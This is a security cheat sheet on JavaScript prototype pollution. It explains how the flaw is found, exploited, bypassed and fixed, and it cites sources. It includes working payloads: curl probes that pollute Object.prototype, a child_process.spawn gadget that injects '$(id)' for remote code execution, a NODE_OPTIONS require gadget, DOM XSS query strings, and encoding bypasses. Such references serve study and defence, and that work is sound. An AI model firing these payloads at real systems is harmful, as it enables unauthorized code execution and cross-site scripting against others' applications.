# Prototype Pollution

> JavaScript-specific: attacker mutates `Object.prototype` (or another base prototype) so every object inherits attacker-controlled properties. Authorized testing only. Map: CWE-1321 Improperly Controlled Modification of Object Prototype Attributes.

## TL;DR
- JS objects inherit via the prototype chain. `({}).__proto__ === Object.prototype` and so does every other object literal. Writing to `Object.prototype` affects the entire process.
- Server-side: vulnerable JSON merge / clone / `Object.assign`-without-key-filter sinks accept user input → write to `__proto__` / `constructor.prototype` → polluted property surfaces in unrelated code paths and often becomes RCE via gadget chains.
- Client-side: query-string parser / `merge(history.state, …)` / Lodash `_.set` writing `__proto__` from URL → DOM-XSS through framework gadgets.
- Two payload forms: `__proto__` (legacy property accessor) and `constructor.prototype` (works on objects where `__proto__` is filtered).

## Detection / Discovery

### Server-side
- Find merge sinks: search for `_.merge`, `_.defaultsDeep`, `_.set`, `extend`, `Object.assign(target, untrustedJSON)`, custom `deepMerge` implementations, `Object.fromEntries(params)` patterns.
- Run **PortSwigger Server-Side Prototype Pollution Scanner** (Burp extension) — sends differential probes and gadget chains automatically.

```bash
# Probe — does the app pollute Object.prototype?
curl -X POST https://target/api/profile -H 'Content-Type: application/json' \
  -d '{"__proto__":{"polluted":"yes"}}'
# Then check for echoed "polluted": "yes" on an unrelated endpoint, or for diff behavior
curl https://target/api/whoami     # response contains "polluted": "yes"?
```

### Client-side
- `DOM Invader` (Burp Suite) — automated client-side prototype-pollution scanner.
- Manual: open browser console on the target page:
  ```js
  Object.prototype.test = 'pp'; console.log({}.test)   // baseline behavior
  // Reload with attacker query string:
  location = location.origin + location.pathname + '?__proto__[test]=pp'
  // After reload check if {}.test === 'pp'
  ```

## Exploitation

### Server-side gadget — Express `prototype-pollution-to-RCE` via `child_process.spawn` options
The Node.js standard library's `child_process.spawn` looks up options like `shell` and `env` on the options object using prototype-chain lookup. If your merge sink lets attacker pollute `Object.prototype.shell = '/bin/bash'` and the app later calls `spawn('ls', [])` with no explicit `shell` option, the bash interpreter is invoked → command injection.
```bash
curl -X POST https://target/api/config -H 'Content-Type: application/json' \
  -d '{"__proto__":{"shell":"/bin/bash","env":{"X":"$(id)"}}}'
# Trigger any feature that calls child_process.spawn / exec with default options
```
Other classic Node gadgets: `tls.connect(options)` → poison `path` (Unix socket path), `Object.prototype.NODE_OPTIONS = '--require=/tmp/x.js'` then any new child Node process loads the attacker module.

### Server-side gadget — Express template injection
If templates are stored as objects with attacker-controllable structure (e.g. a Handlebars compiled fn → polluted `helperMissing` runs attacker code on every render).

### Client-side — DOM XSS via gadget
React, Angular, Vue, jQuery have many internal property lookups (`__html`, `dangerouslySetInnerHTML`, etc.). Polluting one of these creates XSS without injecting `<script>`:
```js
?__proto__[innerHTML]=<img%20src=x%20onerror=alert(1)>
// or
?constructor[prototype][innerHTML]=<img%20src=x%20onerror=alert(1)>
```
Effectiveness depends on the framework version and what property the polluted gadget surfaces in.

### "Constructor" form
If `__proto__` is filtered by the merge function (some sanitisers do `if (key === '__proto__') skip`), use the canonical prototype accessor:
```json
{"constructor": {"prototype": {"polluted": "yes"}}}
```
Same effect — `obj.constructor.prototype === Object.prototype`.

## Bypasses
- Server filters `__proto__` literal but accepts URL-encoded `%5F%5Fproto%5F%5F` or double-encoded `%2575%2533F` — depends on the parser order.
- Filter compares string equality with `===` but the parser produced an exotic Unicode normalisation form (uses `_` somewhere).
- Library updates patch `_.merge` to filter `__proto__` but leave `_.setWith` / `_.set` accepting the same payload — check every API in the library, not just the famous one.

## Defence / Remediation
- **Use safe merge libraries**: `lodash.merge` ≥ 4.17.21 patches `__proto__`; check your version. `defaultsDeep` had the same issue (also patched ≥ 4.17.21).
- **Prefer `Object.create(null)`** for objects you build from untrusted input — `Object.create(null)` has no prototype chain, so writes to `__proto__` create a regular property without polluting the global prototype.
- **Use `Map` / `Set`** for attacker-controlled keyed data; they don't share Object.prototype.
- **Freeze `Object.prototype`**: `Object.freeze(Object.prototype)` early in startup. Combined with `Object.create(null)` this neuters most server-side gadgets. (Test for compatibility; some libraries mutate prototypes legitimately at load time.)
- **JSON schema validation** (Ajv, Zod) at the edge — reject `__proto__` / `constructor` keys in payloads as a positive-model defence.
- **Use `Object.hasOwn(obj, key)` / `Object.prototype.hasOwnProperty.call(obj, key)`** instead of `key in obj` when iterating over attacker-controllable data.
- **Audit `child_process`, `tls`, `crypto` callers** for options-based prototype lookups; pass explicit option objects with `__proto__: null`.
- **Node.js `--frozen-intrinsics`** flag freezes built-in prototypes (experimental as of Node 18; verify against your target version).

## Sources
- PortSwigger — Prototype pollution: https://portswigger.net/web-security/prototype-pollution
- Olivier Arteau — Prototype pollution attack (NorthSec 2018): https://github.com/HoLyVieR/prototype-pollution-nsec18
- Snyk — Prototype pollution research: https://snyk.io/blog/preventing-prototype-pollution-in-javascript/
- PayloadsAllTheThings — Prototype Pollution: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution
- HackTricks Prototype Pollution: https://book.hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/index.html
- Burp Server-Side Prototype Pollution Scanner: https://portswigger.net/bappstore/c1d4bd60626d4178a54d36ee802cf7e8
- DOM Invader (Burp): https://portswigger.net/burp/documentation/desktop/tools/dom-invader
- CWE-1321: https://cwe.mitre.org/data/definitions/1321.html
- BlackFan — Client-side prototype-pollution gadgets: https://github.com/BlackFan/client-side-prototype-pollution
